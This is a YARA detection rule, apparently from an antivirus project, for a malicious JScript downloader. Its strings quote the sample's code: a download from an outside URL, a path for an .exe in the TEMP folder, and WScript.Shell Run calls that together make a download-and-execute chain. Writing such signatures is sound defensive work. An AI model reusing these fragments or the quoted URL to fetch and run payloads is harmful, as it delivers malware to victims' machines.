rule sig_20160329_c62b4ec135c1914af2f32cedb0819dfb {
  meta:
    description = "datamaliciousorder - file 20160329_c62b4ec135c1914af2f32cedb0819dfb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "32f6ce6072240049938c39e79cb1b26fed9d76dd332ef11ca2dc4cdf9e360f1b"

  strings:
    $s1  = "function Hmyjlfziay() {return Xxfqwdqey[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yTw2tOYi.exe\";};" fullword ascii
    $s2  = "do {WScript[Bvhckjyf](Mulumdd() * 11)} while (Cfufywufp[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Knwkm(Sdkrxb, Gonwdk){return Sdkrxb - Gonwdk;};" fullword ascii
    $s4  = "var Xxfqwdqey = function Iwnbyrtdx() {return WScript[Knjbd](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Cfufywufp[Ibgqyuc](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s6  = "function Cbeyhi() {return ((Btdfs == true) && (Btdfs == Tiuctbxyy)) ? 1 : Flqkcprkj;};" fullword ascii
    $s7  = "function Esyxdntf(Avyltdjmz){Xxfqwdqey[\"Run\"](Avyltdjmz, Flqkcprkj, Flqkcprkj);};" fullword ascii
    $s8  = "Btdfs = true; " fullword ascii
    $s9  = "var Mqwvojyfjb = new this[\"Date\"]();" fullword ascii
    $s10 = "var Xpcrqkw = false;" fullword ascii
    $s11 = "function Mulumdd(){return 22;};" fullword ascii
    $s12 = "function Iflwvxp()" fullword ascii
    $s13 = "var Tiuctbxyy = false;" fullword ascii
    $s14 = " while (Ayaoryw){" fullword ascii
    $s15 = "return Knwkm(Bifxhmzo, Ewmqyn);" fullword ascii
    $s16 = "function Wxfpxy(Sipactfbu) {var Kolwam = (1, 2, 3, 4, 5, Sipactfbu); return Kolwam;};" fullword ascii
    $s17 = "Tiuctbxyy = true; " fullword ascii
    $s18 = "function Mnmjbio(){return Kaudtvlme;};" fullword ascii
    $s19 = "var Btdfs = false;" fullword ascii
    $s20 = "function Vqvvldqiy(){return Knjbd;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}